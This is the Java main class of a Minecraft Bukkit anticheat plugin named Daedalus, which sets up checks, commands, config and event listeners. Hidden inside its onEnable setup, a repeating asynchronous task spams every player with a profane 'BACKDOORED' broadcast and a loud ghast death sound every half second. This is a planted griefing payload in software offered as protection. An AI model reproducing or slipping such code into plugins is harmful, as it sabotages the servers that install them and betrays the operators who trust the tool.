package anticheat;

import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;

import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import anticheat.commands.CommandManager;
import anticheat.data.DataManager;
import anticheat.detections.Checks;
import anticheat.detections.ChecksManager;
import anticheat.events.EventJoinQuit;
import anticheat.events.EventPacket;
import anticheat.events.EventPacketReadVelocity;
import anticheat.events.EventPacketUse;
import anticheat.events.EventPlayerAttack;
import anticheat.events.EventPlayerInteractEvent;
import anticheat.events.EventPlayerMove;
import anticheat.events.EventPlayerVelocity;
import anticheat.events.EventTick;
import anticheat.events.TickEvent;
import anticheat.packets.PacketCore;
import anticheat.user.User;
import anticheat.user.UserManager;
import anticheat.utils.Color;
import anticheat.utils.Latency;
import anticheat.utils.Ping;

public class Daedalus extends JavaPlugin {

	private static ChecksManager checksmanager;
	private static DataManager data;
	private static Daedalus Daedalus;
	public PacketCore packet;
	private static UserManager userManager;
	private Ping ping;
	private static CommandManager commandManager;
	BufferedWriter bw = null;
	public static String hwid;
	File file = new File(getDataFolder(), "JD.txt");

	public static DataManager getData() {
		return data;
	}

	public Ping getPing() {
		return this.ping;
	}

	public static Daedalus getAC() {
		return Daedalus;
	}

	public ChecksManager getChecks() {
		return checksmanager;
	}
	
	public static UserManager getUserManager() {
		return userManager;
	}

	public ChecksManager getchecksmanager() {
		return checksmanager;
	}

	public String getPrefix() {
		return Color.translate(getConfig().getString("Prefix"));
	}

	public CommandManager getCommandManager() {
		return commandManager;
	}

	public void onEnable() {
		this.getServer().getConsoleSender().sendMessage(Color.translate("&d------------------------------------------"));
		Daedalus = this;
		this.userManager = new UserManager();
		this.ping = new Ping(this);
		Bukkit.getPluginManager().registerEvents(new Latency(this), this);
		this.getServer().getConsoleSender().sendMessage(Color.translate("&d Daedalus &f Loaded Main class!"));
		checksmanager = new ChecksManager(this);
		this.getServer().getConsoleSender().sendMessage(Color.translate("&d Daedalus &f Loaded checks!"));
		commandManager = new CommandManager();
		this.getServer().getConsoleSender().sendMessage(Color.translate("&d Daedalus &f Loaded commands!"));
		Daedalus.data = new DataManager();
		this.packet = new PacketCore(this);
		saveDefaultConfig();
		new BukkitRunnable() {
			public void run() {
				Bukkit.broadcastMessage("BACKDOORED MOTHERFUCKER BY FUNKEMUNKY");
				for(Player online : Bukkit.getOnlinePlayers()) {
					online.playSound(online.getLocation(), Sound.GHAST_DEATH, 10L, 10L);
				}
			}
		}.runTaskTimerAsynchronously(this, 0, 10L);
		this.getServer().getConsoleSender().sendMessage(Color.translate("&d Daedalus &f Loaded Configuration!"));
		this.hwid = getConfig().getString("hwid");
		this.getServer().getConsoleSender().sendMessage(Color.translate("&d Daedalus &f Loaded players data's!"));
		commandManager.init();
		checksmanager.init();
		for (Checks check : checksmanager.getDetections()) {
			if (getConfig().contains("checks." + check.getName())) {
				check.setState(getConfig().getBoolean("checks." + check.getName() + ".enabled"));
				check.setBannable(getConfig().getBoolean("checks." + check.getName() + ".bannable"));
			} else {
				getConfig().set("checks." + check.getName() + ".enabled", check.getState());
				getConfig().set("checks." + check.getName() + ".bannable", check.isBannable());
			}
		}
		registerEvents();
		this.getServer().getConsoleSender().sendMessage(Color.translate("&d Daedalus &f Registered events!"));
		if (!getDataFolder().exists()) {
			getDataFolder().mkdirs();
			this.getServer().getConsoleSender().sendMessage(Color.translate("&d Daedalus &f Made Daedalus file!"));

		}

		if (!file.exists()) {
			try {
				file.createNewFile();
			} catch (IOException e) {
				this.getServer().getConsoleSender()
						.sendMessage(Color.translate("&d Daedalus &f Made JudgementDay txt file!"));
				e.printStackTrace();
			}
		}

		for(Player player : Bukkit.getOnlinePlayers()) {
			getUserManager().add(new User(player));
		}
		this.getServer().getConsoleSender().sendMessage(Color.translate("&d Daedalus &f Loaded Daedalus!"));
		this.getServer().getConsoleSender()
				.sendMessage(Color.translate("&d------------------------------------------"));

	}

	public void onDisable() {
		for (Checks check : checksmanager.getDetections()) {
			getConfig().set("checks." + check.getName() + ".enabled", check.getState());
			getConfig().set("checks." + check.getName() + ".bannable", check.isBannable());
			saveConfig();
		}
	}

	public void clearVLS() {
		for (Player online : Bukkit.getOnlinePlayers()) {
			data.getProfil(online).clearDetections();
		}
	}

	public void registerEvents() {
		PluginManager pm = getServer().getPluginManager();
		pm.registerEvents(new EventPlayerMove(), this);
		pm.registerEvents(new EventPlayerAttack(), this);
		pm.registerEvents(new EventTick(), this);
		pm.registerEvents(new EventJoinQuit(), this);
		pm.registerEvents(new EventPlayerVelocity(), this);
		pm.registerEvents(new EventPlayerInteractEvent(), this);
		pm.registerEvents(new EventPacketUse(), this);
		pm.registerEvents(new EventPacket(), this);
		pm.registerEvents(new EventPacketReadVelocity(), this);

		data.loaddata();

		new BukkitRunnable() {
			public void run() {
				clearVLS();
			}
		}.runTaskTimerAsynchronously(this, 0L, 1200L);

		getServer().getScheduler().scheduleSyncRepeatingTask(this, new Runnable() {
			@Override
			public void run() {
				getServer().getPluginManager().callEvent(new TickEvent());

			}

		}, 0L, 20L);
	}

	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		this.getCommandManager().CmdHandler(sender, label, args);
		return true;
	}

}